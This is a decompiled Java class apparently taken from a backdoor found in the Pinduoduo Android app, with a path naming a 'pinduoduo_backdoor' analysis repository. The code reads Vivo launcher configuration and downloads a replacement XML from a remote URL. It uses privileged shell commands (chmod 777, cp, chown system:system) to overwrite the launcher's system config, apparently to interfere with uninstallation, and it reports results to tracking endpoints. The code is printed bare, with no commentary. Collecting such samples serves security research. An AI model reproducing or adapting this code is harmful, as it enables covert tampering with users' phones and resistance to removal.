package com.google.android.sd.biz_dynamic_dex.vivo_official_uninstall;

import android.content.Context;
import com.google.android.sd.biz_dynamic_dex.a.a;
import com.google.android.sd.cmd.CmdData;
import com.google.android.sd.cmd.CmdHandler;
import com.google.android.sd.utils.IoUtils;
import com.google.android.sd.utils.TrackUtils;
import com.google.android.sd.utils.Utils;
import java.io.File;
import java.util.HashMap;
import java.util.Map;
import java.util.TimerTask;
import org.json.JSONException;
import org.json.JSONObject;

public final class d {
  private static String a;
  
  private static Map<String, String> a(boolean paramBoolean, String paramString) {
    String str;
    HashMap<Object, Object> hashMap = new HashMap<Object, Object>();
    if (paramBoolean) {
      hashMap.put("status", "1");
      str = "true";
    } else {
      hashMap.put("status", "0");
      str = "false";
    } 
    hashMap.put("result", str);
    hashMap.put("details", paramString);
    return (Map)hashMap;
  }
  
  private static void a(Context paramContext) {
    try {
      return;
    } finally {
      paramContext = null;
    } 
  }
  
  private static void a(Context paramContext, String paramString) {
    JSONObject jSONObject = new JSONObject();
    CmdData cmdData = new CmdData(1005, a, "client");
    try {
      a(paramContext);
      jSONObject.put("details", paramString);
      CmdHandler.dispatch(paramContext, Utils.buildSucceedRespData(cmdData, jSONObject, null));
      TrackUtils.submitTrack(paramContext, 22, a(true, paramString));
      return;
    } catch (JSONException jSONException) {
      CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(cmdData, jSONException.toString(), null));
      TrackUtils.submitTrack(paramContext, 22, a(false, paramString));
      return;
    } 
  }
  
  public static void a(Context paramContext, JSONObject paramJSONObject) {
    // Byte code:
    //   0: aload_1
    //   1: ldc 'uuid'
    //   3: invokevirtual optString : (Ljava/lang/String;)Ljava/lang/String;
    //   6: putstatic com/google/android/sd/biz_dynamic_dex/vivo_official_uninstall/d.a : Ljava/lang/String;
    //   9: aconst_null
    //   10: astore #6
    //   12: aconst_null
    //   13: astore #4
    //   15: aload_0
    //   16: invokevirtual getApplicationContext : ()Landroid/content/Context;
    //   19: invokevirtual getContentResolver : ()Landroid/content/ContentResolver;
    //   22: ldc 'content://com.vivo.abe.unifiedconfig.provider/configs'
    //   24: invokestatic parse : (Ljava/lang/String;)Landroid/net/Uri;
    //   27: aconst_null
    //   28: aconst_null
    //   29: iconst_4
    //   30: anewarray java/lang/String
    //   33: dup
    //   34: iconst_0
    //   35: ldc 'BBKLauncher2'
    //   37: aastore
    //   38: dup
    //   39: iconst_1
    //   40: ldc '1'
    //   42: aastore
    //   43: dup
    //   44: iconst_2
    //   45: ldc '1.0'
    //   47: aastore
    //   48: dup
    //   49: iconst_3
    //   50: ldc 'com.bbk.launcher2_configs'
    //   52: aastore
    //   53: aconst_null
    //   54: invokevirtual query : (Landroid/net/Uri;[Ljava/lang/String;Ljava/lang/String;[Ljava/lang/String;Ljava/lang/String;)Landroid/database/Cursor;
    //   57: astore #5
    //   59: aload #5
    //   61: ifnull -> 418
    //   64: aload #5
    //   66: invokeinterface getCount : ()I
    //   71: iconst_1
    //   72: if_icmple -> 118
    //   75: new java/lang/StringBuilder
    //   78: dup
    //   79: ldc 'cursor_count_'
    //   81: invokespecial <init> : (Ljava/lang/String;)V
    //   84: astore_1
    //   85: aload_1
    //   86: aload #5
    //   88: invokeinterface getCount : ()I
    //   93: invokevirtual append : (I)Ljava/lang/StringBuilder;
    //   96: pop
    //   97: aload_0
    //   98: aload_1
    //   99: invokevirtual toString : ()Ljava/lang/String;
    //   102: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   105: aload #5
    //   107: ifnull -> 117
    //   110: aload #5
    //   112: invokeinterface close : ()V
    //   117: return
    //   118: aload #5
    //   120: invokeinterface getCount : ()I
    //   125: istore_2
    //   126: iload_2
    //   127: ifne -> 287
    //   130: new org/json/JSONObject
    //   133: dup
    //   134: invokespecial <init> : ()V
    //   137: astore #4
    //   139: new com/google/android/sd/cmd/CmdData
    //   142: dup
    //   143: sipush #1005
    //   146: getstatic com/google/android/sd/biz_dynamic_dex/vivo_official_uninstall/d.a : Ljava/lang/String;
    //   149: ldc 'client'
    //   151: invokespecial <init> : (ILjava/lang/String;Ljava/lang/String;)V
    //   154: astore #6
    //   156: aload #4
    //   158: ldc 'details'
    //   160: ldc 'start_add'
    //   162: invokevirtual put : (Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;
    //   165: pop
    //   166: aload #6
    //   168: aload #4
    //   170: aconst_null
    //   171: invokestatic buildSucceedRespData : (Lcom/google/android/sd/cmd/CmdData;Lorg/json/JSONObject;Lorg/json/JSONObject;)Lcom/google/android/sd/cmd/CmdData;
    //   174: pop
    //   175: aload_0
    //   176: bipush #22
    //   178: iconst_1
    //   179: ldc 'start_add'
    //   181: invokestatic a : (ZLjava/lang/String;)Ljava/util/Map;
    //   184: invokestatic submitTrack : (Landroid/content/Context;ILjava/util/Map;)V
    //   187: goto -> 202
    //   190: aload_0
    //   191: bipush #22
    //   193: iconst_0
    //   194: ldc 'start_add'
    //   196: invokestatic a : (ZLjava/lang/String;)Ljava/util/Map;
    //   199: invokestatic submitTrack : (Landroid/content/Context;ILjava/util/Map;)V
    //   202: aload_1
    //   203: ldc '2304'
    //   205: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   208: astore #4
    //   210: aload_1
    //   211: ldc 'permission'
    //   213: invokevirtual getBoolean : (Ljava/lang/String;)Z
    //   216: ifeq -> 268
    //   219: aload_0
    //   220: aload #4
    //   222: ldc '2304'
    //   224: invokestatic a : (Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)Z
    //   227: ifeq -> 259
    //   230: aload_0
    //   231: ldc 'need_insertDb'
    //   233: invokestatic a : (Landroid/content/Context;Ljava/lang/String;)V
    //   236: new java/util/Timer
    //   239: dup
    //   240: invokespecial <init> : ()V
    //   243: new com/google/android/sd/biz_dynamic_dex/vivo_official_uninstall/d$1
    //   246: dup
    //   247: invokespecial <init> : ()V
    //   250: ldc2_w 8000
    //   253: invokevirtual schedule : (Ljava/util/TimerTask;J)V
    //   256: goto -> 274
    //   259: aload_0
    //   260: ldc 'replace_fail'
    //   262: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   265: goto -> 274
    //   268: aload_0
    //   269: ldc 'no permission'
    //   271: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   274: aload #5
    //   276: ifnull -> 286
    //   279: aload #5
    //   281: invokeinterface close : ()V
    //   286: return
    //   287: aload #5
    //   289: invokeinterface moveToNext : ()Z
    //   294: ifeq -> 424
    //   297: aload #5
    //   299: aload #5
    //   301: ldc 'id'
    //   303: invokeinterface getColumnIndex : (Ljava/lang/String;)I
    //   308: invokeinterface getInt : (I)I
    //   313: istore_2
    //   314: iload_2
    //   315: invokestatic a : (I)I
    //   318: istore_3
    //   319: iload_3
    //   320: iconst_2
    //   321: if_icmpeq -> 350
    //   324: aload_0
    //   325: ldc 'already, result code: '
    //   327: iload_3
    //   328: invokestatic valueOf : (I)Ljava/lang/String;
    //   331: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   334: invokestatic a : (Landroid/content/Context;Ljava/lang/String;)V
    //   337: aload #5
    //   339: ifnull -> 349
    //   342: aload #5
    //   344: invokeinterface close : ()V
    //   349: return
    //   350: aload_1
    //   351: iload_2
    //   352: invokestatic valueOf : (I)Ljava/lang/String;
    //   355: invokevirtual optJSONObject : (Ljava/lang/String;)Lorg/json/JSONObject;
    //   358: astore #4
    //   360: aload #4
    //   362: ifnull -> 402
    //   365: aload_0
    //   366: aload #4
    //   368: iload_2
    //   369: invokestatic valueOf : (I)Ljava/lang/String;
    //   372: invokestatic a : (Landroid/content/Context;Lorg/json/JSONObject;Ljava/lang/String;)Z
    //   375: ifeq -> 393
    //   378: ldc 'am broadcast -a com.vivo.daemonService.unifiedconfig.update_finish_broadcast_BBKLauncher2 -p com.bbk.launcher2'
    //   380: invokestatic a : (Ljava/lang/String;)Z
    //   383: pop
    //   384: aload_0
    //   385: ldc 'success'
    //   387: invokestatic a : (Landroid/content/Context;Ljava/lang/String;)V
    //   390: goto -> 287
    //   393: aload_0
    //   394: ldc 'replace_fail'
    //   396: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   399: goto -> 287
    //   402: aload_0
    //   403: ldc 'can_not_find_config_'
    //   405: iload_2
    //   406: invokestatic valueOf : (I)Ljava/lang/String;
    //   409: invokevirtual concat : (Ljava/lang/String;)Ljava/lang/String;
    //   412: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   415: goto -> 287
    //   418: aload_0
    //   419: ldc 'cursor_null'
    //   421: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   424: aload #5
    //   426: ifnull -> 488
    //   429: aload #5
    //   431: invokeinterface close : ()V
    //   436: return
    //   437: astore_0
    //   438: aload #5
    //   440: astore #4
    //   442: goto -> 489
    //   445: astore #4
    //   447: aload #5
    //   449: astore_1
    //   450: aload #4
    //   452: astore #5
    //   454: goto -> 466
    //   457: astore_0
    //   458: goto -> 489
    //   461: astore #5
    //   463: aload #6
    //   465: astore_1
    //   466: aload_1
    //   467: astore #4
    //   469: aload_0
    //   470: aload #5
    //   472: invokestatic getStackTraceString : (Ljava/lang/Throwable;)Ljava/lang/String;
    //   475: invokestatic b : (Landroid/content/Context;Ljava/lang/String;)V
    //   478: aload_1
    //   479: ifnull -> 488
    //   482: aload_1
    //   483: invokeinterface close : ()V
    //   488: return
    //   489: aload #4
    //   491: ifnull -> 501
    //   494: aload #4
    //   496: invokeinterface close : ()V
    //   501: aload_0
    //   502: athrow
    //   503: astore_0
    //   504: return
    //   505: astore #4
    //   507: goto -> 190
    //   510: astore_0
    //   511: return
    //   512: astore_0
    //   513: return
    //   514: astore_0
    //   515: return
    //   516: astore_0
    //   517: return
    //   518: astore_1
    //   519: goto -> 501
    // Exception table:
    //   from	to	target	type
    //   15	59	461	java/lang/Exception
    //   15	59	457	finally
    //   64	105	445	java/lang/Exception
    //   64	105	437	finally
    //   110	117	503	java/lang/Exception
    //   118	126	445	java/lang/Exception
    //   118	126	437	finally
    //   130	156	445	java/lang/Exception
    //   130	156	437	finally
    //   156	187	505	org/json/JSONException
    //   156	187	445	java/lang/Exception
    //   156	187	437	finally
    //   190	202	445	java/lang/Exception
    //   190	202	437	finally
    //   202	256	445	java/lang/Exception
    //   202	256	437	finally
    //   259	265	445	java/lang/Exception
    //   259	265	437	finally
    //   268	274	445	java/lang/Exception
    //   268	274	437	finally
    //   279	286	510	java/lang/Exception
    //   287	319	445	java/lang/Exception
    //   287	319	437	finally
    //   324	337	445	java/lang/Exception
    //   324	337	437	finally
    //   342	349	512	java/lang/Exception
    //   350	360	445	java/lang/Exception
    //   350	360	437	finally
    //   365	390	445	java/lang/Exception
    //   365	390	437	finally
    //   393	399	445	java/lang/Exception
    //   393	399	437	finally
    //   402	415	445	java/lang/Exception
    //   402	415	437	finally
    //   418	424	445	java/lang/Exception
    //   418	424	437	finally
    //   429	436	514	java/lang/Exception
    //   469	478	457	finally
    //   482	488	516	java/lang/Exception
    //   494	501	518	java/lang/Exception
  }
  
  private static boolean a(Context paramContext, JSONObject paramJSONObject, String paramString) {
    if (paramJSONObject == null)
      return false; 
    String str1 = paramJSONObject.optString("modify_md5");
    String str2 = paramJSONObject.optString("url_suffix");
    File file = new File("sdcard", String.format("BBKLauncher2_custom_%s.xml", new Object[] { paramString }));
    try {
      Utils.downloadFile(paramContext, "1", str2, file, str1);
      str2 = String.format("data/bbkcore/BBKLauncher2_custom_%s.xml", new Object[] { paramString });
      a.a("chmod 777 ".concat(String.valueOf(str2)));
      StringBuilder stringBuilder2 = new StringBuilder("cp ");
      stringBuilder2.append(file.getAbsolutePath());
      stringBuilder2.append(" ");
      stringBuilder2.append(str2);
      a.a(stringBuilder2.toString());
      file.deleteOnExit();
      StringBuilder stringBuilder1 = new StringBuilder("cp ");
      stringBuilder1.append(str2);
      stringBuilder1.append(" sdcard/");
      stringBuilder1.append(String.format("BBKLauncher2_custom_%s.xml", new Object[] { paramString }));
      a.a(stringBuilder1.toString());
      a.a("chmod 777 ".concat(String.valueOf(str2)));
      a.a("chown system:system ".concat(String.valueOf(str2)));
      String str = IoUtils.calFileMd5(new File("sdcard", String.format("BBKLauncher2_custom_%s.xml", new Object[] { paramString })));
      if (str1.equals(str))
        return true; 
      b(paramContext, " check_md5_fail ".concat(String.valueOf(str)));
      return false;
    } catch (Exception exception) {
      StringBuilder stringBuilder = new StringBuilder(" down_load_fail ");
      stringBuilder.append(exception.getMessage());
      b(paramContext, stringBuilder.toString());
      return false;
    } 
  }
  
  private static void b(Context paramContext, String paramString) {
    CmdHandler.dispatch(paramContext, Utils.buildErrorRespData(new CmdData(1005, a, "client"), paramString, null));
    TrackUtils.submitTrack(paramContext, 22, a(false, paramString));
  }
}


/* Location:              C:\Users\daimiaopeng\Downloads\pinduoduo_backdoor-main\pinduoduo_backdoor-main\dex\183bb87aa7d744a195741ce524577dd0-dex2jar.jar!\com\google\android\sd\biz_dynamic_dex\vivo_official_uninstall\d.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */